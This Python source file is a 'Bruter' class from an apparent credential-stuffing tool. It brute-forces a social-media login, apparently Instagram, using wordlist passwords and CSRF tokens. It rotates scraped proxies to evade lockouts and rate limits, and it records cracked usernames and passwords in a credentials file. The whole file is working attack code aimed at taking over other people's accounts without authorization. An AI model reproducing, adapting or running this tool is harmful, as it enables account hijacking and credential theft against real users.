# Date: 05/05/2018
# Author: Pure-L0G1C
# Description: Bruter

from .spyder import Spyder 
from .scraper import Queue 
from .session import Session
from time import time, sleep 
from threading import Thread, Lock
from os import system, remove, path
from platform import system as platform
from .const import max_fails, fetch_time, site_details, max_proxy_usage, credentials

class Bruter(object):
 def __init__(self, username, threads, wordlist):
  self.max_threads = threads if all([threads <= 16, threads > 0]) else 16 # 16 is the absolute maximum
  self.cls = 'cls' if platform() == 'Windows' else 'clear'
  self.session = Session(username, wordlist)
  self.proxy_usage_count = 0
  self.wordlist = wordlist
  self.username = username
  self.user_abort = False
  self.passlist = Queue()
  self.spyder = Spyder()
  self.retrieve = False 
  self.isFound = False 
  self.isAlive = True
  self.lock = Lock()
  self.read = False 
  self.attempts = 0
  self.threads = 0 
  self.pwd = None
  self.ip = None 
  self.fails = 0

  # reduce flickering display on Windows
  self.last_attempt = None
  self.last_proxy = None 
  self.last_ip = None 

 def login(self, pwd):
  try:
   if not self.spyder.proxies.qsize:
    return 

   with self.lock:
    self.pwd = pwd 
    self.threads += 1
    self.proxy_usage_count += 1
    
   br = self.spyder.br
   home_url = site_details['home_url']
   login_url = site_details['login_url']
   username_field = site_details['username_field']
   password_field = site_details['password_field']
   
   data = { username_field: self.username, password_field: pwd }
   br.headers.update({'X-CSRFToken': br.get(home_url).cookies.get_dict()['csrftoken']})
  
   # login 
   response = br.post(login_url, data=data, timeout=fetch_time).json()

     # validate
   if 'authenticated' in response:
    if response['authenticated']:
     self.pwd_found(pwd)
   elif 'message' in response:
    if response['message'] == 'checkpoint_required':
     self.pwd_found(pwd)
    elif response['status'] == 'fail': # account got locked
      if self.threads > 0:
       with self.lock:self.threads -= 1
      return
    else:pass 
   else:pass 
   
   with self.lock:
    if all([not self.isFound, self.isAlive, pwd in self.passlist.queue]):
     self.passlist.queue.pop(self.passlist.queue.index(pwd)) 
     self.attempts += 1

  except KeyboardInterrupt:
   self.user_abort = True 
   self.stop()
  except:
   with self.lock:self.fails += 1
  finally:
    if self.threads > 0:
     with self.lock:self.threads -= 1 

 def pwd_found(self, pwd):
  if self.isFound:return

  self.isFound = True
  del self.passlist.queue[:]
  self.display(pwd, True)
  
 def kill(self):
  self.isAlive = False 
  self.spyder.isAlive = False 

 def display(self, pwd, isFound=False, n=1): 
  if not isFound:system(self.cls)
  else:
   with open(credentials, 'a') as f:
    f.write('Username: {}\nPassword: {}\n\n'.format(self.username, pwd))

  pwd = pwd if pwd else ''
  ip = '{}[{}]'.format(self.ip, self.spyder.proxy_info['country']) if all([self.ip, self.spyder.proxy_info]) else ''
  
  try:
   if not isFound:
    print('[-] Proxy-IP: {}\n[-] Wordlist: {}\n[-] Username: {}\n[-] Password: {}\n[-] Attempts: {}\n[-] Proxies: {}'.
          format(ip, self.wordlist, self.username, pwd, self.attempts, self.spyder.proxies.qsize))
    if not n:self.display(pwd, isFound=True)
   else:
    if n:self.display(pwd, n-1)
    print('\n[!] Password Found\n[+] Username: {}\n[+] Password: {}'.format(self.username, pwd))
  except:pass 

 def attack(self):
  while all([not self.isFound, self.isAlive]):
   try:
    if any([not self.ip, self.proxy_usage_count >= max_proxy_usage, self.fails >= max_fails]):
     try:
      if not self.spyder.proxies.qsize:continue
      self.spyder.renew_proxy()
      ip = self.spyder.ip_addr() 
      if not ip:continue
      self.proxy_usage_count = 0
      self.fails = 0
      self.ip = ip
     except KeyboardInterrupt:
      self.user_abort = True 
      self.stop()
  
    # try all the passwords in the queue
    for pwd in self.passlist.queue:
     if self.threads >= self.max_threads:break
     if any([not self.isAlive, self.isFound]):break
     if self.proxy_usage_count >= max_proxy_usage:break

     # login thread     
     login = Thread(target=self.login, args=[pwd])
     login.daemon = True
     login.start()  

    # wait time 
    started = time() 
     
    # wait for threads 
    while all([not self.isFound, self.isAlive, self.threads>0, self.passlist.qsize]):
     try:
      # bypass slow, authentication required, and hanging proxies
      if int(time() - started) >= 5:
       self.fails = max_fails
       self.threads = 0
     except:pass
    else:    
     self.threads = 0
     if all([self.isAlive, not self.isFound]):
      self.session.write(self.attempts, self.passlist.queue)
   except KeyboardInterrupt:
    self.user_abort = True 
    self.stop()
   except:pass

 def pwd_manager(self):
  with open(self.wordlist, 'r') as wordlist:
   attempts = 0
   for pwd in wordlist:
    if any([not self.isAlive, self.isFound]):break

    if self.retrieve:
     if attempts < (self.attempts + self.passlist.qsize)-1:
      attempts += 1
      continue
     else:self.retrieve = False

    if self.passlist.qsize <= self.max_threads:
     self.passlist.put(pwd.replace('\n', '').replace('\r', '').replace('\t', ''))
    else:
     while all([self.passlist.qsize, not self.isFound, self.isAlive]):pass
     if all([not self.passlist.qsize, not self.isFound, self.isAlive]):
      self.passlist.put(pwd.replace('\n', '').replace('\r', '').replace('\t', ''))

  # done reading wordlist
  self.read = True if all([not self.user_abort, self.isAlive]) else False 
  while all([not self.isFound, self.isAlive, self.passlist.qsize]):
   try:sleep(1.5)
   except KeyboardInterrupt:
    self.user_abort = True 
    self.stop()
  if self.isAlive:self.stop()

 def stop(self):
  if any([self.read, self.isFound]):self.session.delete()
  else:self.session.write(self.attempts, self.passlist.queue)
  self.kill()

 def primary_threads(self):
  proxy_manager = Thread(target=self.spyder.proxy_manager)
  proxy_manager.daemon = True
  proxy_manager.start()

  pwd_manager = Thread(target=self.pwd_manager)
  pwd_manager.daemon = True
  pwd_manager.start()

  attack = Thread(target=self.attack)
  attack.daemon = True
  attack.start()
 
 def start(self):
  self.primary_threads()
  while all([not self.isFound, self.isAlive]):
   try:
    if self.isAlive:
     if self.ip:
      if any([self.last_attempt != self.attempts, self.last_proxy != self.spyder.proxies.qsize, self.last_ip != self.ip]):
       self.display(self.pwd)
       self.last_proxy = self.spyder.proxies.qsize
       self.last_attempt = self.attempts
       self.last_ip = self.ip
     else:self.display(self.pwd)
     if not self.spyder.proxy_info:
      print('\n[+] Searching for proxies ...')
     sleep(1.5 if not self.spyder.proxy_info else 0.5)
   except KeyboardInterrupt:
    self.user_abort = True 
    self.stop()
